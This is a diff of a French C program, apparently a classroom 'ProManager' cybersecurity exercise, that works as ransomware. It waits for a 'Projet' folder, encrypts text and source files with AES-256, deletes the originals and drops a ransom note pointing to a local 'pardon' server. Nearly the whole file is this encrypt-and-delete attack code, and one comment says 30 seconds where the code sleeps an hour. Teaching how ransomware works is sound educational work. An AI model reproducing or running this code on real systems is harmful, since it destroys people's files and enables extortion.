@@ -6,73 +6,30 @@
 #include <sys/stat.h>
 #include <openssl/conf.h>
 #include <openssl/evp.h>
-#include <openssl/err.h>
+#include <openssl/rand.h>
 
-#define BUF_SIZE 4096
-#define PROJET_PATH "Projet"
+#define BUFFER_SIZE 4096
+#define PROJET_DIR "Projet"
 #define CLE_FILE "cle.key"
 #define IV_FILE "cle.iv"
 #define RANCON_FILE "Projet/RANÇON.txt"
 
-void handleErrors(void) {
-    ERR_print_errors_fp(stderr);
-    abort();
+int extension_valide(const char *filename) {
+    return strstr(filename, ".txt") || strstr(filename, ".md") || strstr(filename, ".c") || strstr(filename, ".h");
 }
 
-void charger_cle_iv(unsigned char *key, unsigned char *iv) {
-    FILE *k = fopen(CLE_FILE, "rb");
-    if (!k) {
-        perror("Erreur ouverture cle.key");
-        exit(EXIT_FAILURE);
-    }
-
-    FILE *v = fopen(IV_FILE, "rb");
-    if (!v) {
-        fclose(k);
-        perror("Erreur ouverture cle.iv");
-        exit(EXIT_FAILURE);
-    }
-
-    if (fread(key, 1, 32, k) != 32) {
-        fclose(k);
-        fclose(v);
-        fprintf(stderr, "Erreur : cle.key doit contenir 32 octets\n");
-        exit(EXIT_FAILURE);
-    }
-
-    if (fread(iv, 1, 16, v) != 16) {
-        fclose(k);
-        fclose(v);
-        fprintf(stderr, "Erreur : cle.iv doit contenir 16 octets\n");
-        exit(EXIT_FAILURE);
-    }
-
-    fclose(k);
-    fclose(v);
-}
-
-int extension_valide(const char *nom) {
-    return strstr(nom, ".txt") || strstr(nom, ".md") || strstr(nom, ".c") || strstr(nom, ".h");
-}
-
-void chiffrer_fichier(const char *in_path, const char *out_path, unsigned char *key, unsigned char *iv) {
-    FILE *in = fopen(in_path, "rb");
-    FILE *out = fopen(out_path, "wb");
-    if (!in || !out) {
-        perror("Erreur ouverture fichier");
-        if (in) fclose(in);
-        if (out) fclose(out);
-        return;
-    }
+void chiffrer_fichier(const char *input, const char *output, unsigned char *key, unsigned char *iv) {
+    FILE *in = fopen(input, "rb");
+    FILE *out = fopen(output, "wb");
+    if (!in || !out) { perror("Erreur fichiers"); return; }
 
     EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
     EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
 
-    unsigned char inbuf[BUF_SIZE];
-    unsigned char outbuf[BUF_SIZE + EVP_MAX_BLOCK_LENGTH];
+    unsigned char inbuf[BUFFER_SIZE], outbuf[BUFFER_SIZE + EVP_MAX_BLOCK_LENGTH];
     int inlen, outlen;
 
-    while ((inlen = fread(inbuf, 1, BUF_SIZE, in)) > 0) {
+    while ((inlen = fread(inbuf, 1, BUFFER_SIZE, in)) > 0) {
         EVP_EncryptUpdate(ctx, outbuf, &outlen, inbuf, inlen);
         fwrite(outbuf, 1, outlen, out);
     }
@@ -83,68 +40,80 @@ void chiffrer_fichier(const char *in_path, const char *out_path, unsigned char *
     EVP_CIPHER_CTX_free(ctx);
     fclose(in);
     fclose(out);
-    remove(in_path);
-}
-
-void parcourir_et_chiffrer(const char *dir_path, unsigned char *key, unsigned char *iv) {
-    DIR *dir = opendir(dir_path);
-    if (!dir) {
-        perror("Erreur ouverture dossier Projet");
-        exit(EXIT_FAILURE);
-    }
-
-    struct dirent *entry;
-    char in_path[512], out_path[512];
-
-    while ((entry = readdir(dir)) != NULL) {
-        if (entry->d_type == DT_REG && extension_valide(entry->d_name)) {
-            snprintf(in_path, sizeof(in_path), "%s/%s", dir_path, entry->d_name);
-            snprintf(out_path, sizeof(out_path), "%s/%s.enc", dir_path, entry->d_name);
-            printf("Chiffrement : %s\n", entry->d_name);
-            chiffrer_fichier(in_path, out_path, key, iv);
-        }
-    }
-
-    closedir(dir);
+    remove(input);
 }
 
 void generer_rancon() {
     FILE *f = fopen(RANCON_FILE, "w");
-    if (!f) {
-        perror("Erreur création rançon");
-        return;
-    }
-
     fprintf(f,
-        "#########################################\n"
-        "#        FICHIERS CHIFFRÉS              #\n"
-        "#########################################\n\n"
-        "Vos fichiers dans ce dossier ont été chiffrés par ProManager,\n"
-        "car la date limite de remise du projet a été dépassée.\n\n"
-        "Chaque fichier a été chiffré en AES-256 avec une clé unique.\n\n"
-        "Ne tentez pas de modifier les fichiers `.enc`, vous risqueriez\n"
-        "de les rendre irrécupérables.\n\n"
-        "-----------------------------------------\n\n"
-        "Pour récupérer vos fichiers :\n\n"
-        "1. Lancez le programme `client_decrypt` dans TP/.\n"
-        "2. Connectez-vous au serveur à 127.0.0.1:4242\n"
-        "3. Envoyez une justification d'au moins 20 caractères.\n\n"
-        "Si vos excuses sont acceptées, vous recevrez :\n"
-        "- La clé de déchiffrement\n"
-        "- Le vecteur IV\n\n"
-        "Fichiers concernés : *.txt, *.md, *.c, *.h\n\n"
-        "-----------------------------------------\n"
-        "TP cybersécurité - ProManager\n"
+    "#########################################\n"
+    "#        ❌  FICHIERS CHIFFRÉS  ❌       #\n"
+    "#########################################\n\n"
+    "Vos fichiers dans ce dossier ont été chiffrés par ProManager,\n"
+    "car la date limite de remise du projet a été dépassée.\n\n"
+    "Chaque fichier a été chiffré en AES-256 avec une clé unique.\n\n"
+    "Ne tentez pas de modifier les fichiers `.enc`, vous risqueriez\n"
+    "de les rendre irrécupérables.\n\n"
+    "────────────────────────────────────────\n\n"
+    "✅ Pour récupérer vos fichiers :\n\n"
+    "1. Lancez le programme `client_decrypt` disponible dans le dossier TP/.\n"
+    "2. Connectez-vous au serveur à l'adresse : 127.0.0.1, port : 4242\n"
+    "3. Envoyez une justification écrite (20 caractères minimum).\n"
+    "4. Si vos excuses sont acceptées, vos fichiers seront déchiffrés automatiquement.\n\n"
+    "────────────────────────────────────────\n"
     );
-
     fclose(f);
 }
 
+void generer_cle_iv(unsigned char *key, unsigned char *iv) {
+    RAND_bytes(key, 32);
+    RAND_bytes(iv, 16);
+
+    FILE *fk = fopen(CLE_FILE, "wb"), *fv = fopen(IV_FILE, "wb");
+    fwrite(key, 1, 32, fk);
+    fwrite(iv, 1, 16, fv);
+    fclose(fk); fclose(fv);
+}
+
 int main() {
+    printf("[INFO] Surveillance du dossier '%s'...\n", PROJET_DIR);
+
+    while (access(PROJET_DIR, F_OK) != 0)
+        sleep(5);
+
+    printf("[INFO] Dossier détecté : %s\n", PROJET_DIR);
+    printf("[INFO] Attente de 30 secondes...\n");
+    sleep(3600); // mettre 3600 pour 1h réelle
+
     unsigned char key[32], iv[16];
-    charger_cle_iv(key, iv);
-    parcourir_et_chiffrer(PROJET_PATH, key, iv);
+    generer_cle_iv(key, iv);
+
+    DIR *dir = opendir(PROJET_DIR);
+    struct dirent *entry;
+    char input[256], output[256];
+
+    while ((entry = readdir(dir))) {
+        if (entry->d_type == DT_REG && extension_valide(entry->d_name)) {
+            sprintf(input, "%s/%s", PROJET_DIR, entry->d_name);
+            sprintf(output, "%s.enc", input);
+            printf("[INFO] Chiffrement : %s\n", entry->d_name);
+            chiffrer_fichier(input, output, key, iv);
+        }
+    }
+    closedir(dir);
+
     generer_rancon();
-    printf("Fichiers chiffrés avec succès. RANÇON.txt généré.\n");
+    printf("[OK] RANÇON.txt généré.\n");
+
+    // Lancement automatique du serveur_pardon
+    printf("[INFO] Lancement du serveur_pardon...\n");
+    if (fork() == 0) {
+        execl("./serveur_pardon", "./serveur_pardon", NULL);
+        perror("[ERREUR] Lancement serveur_pardon");
+        exit(EXIT_FAILURE);
+    }
+
+    printf("[OK] serveur_pardon lancé en tâche de fond.\n");
+
     return 0;
 }
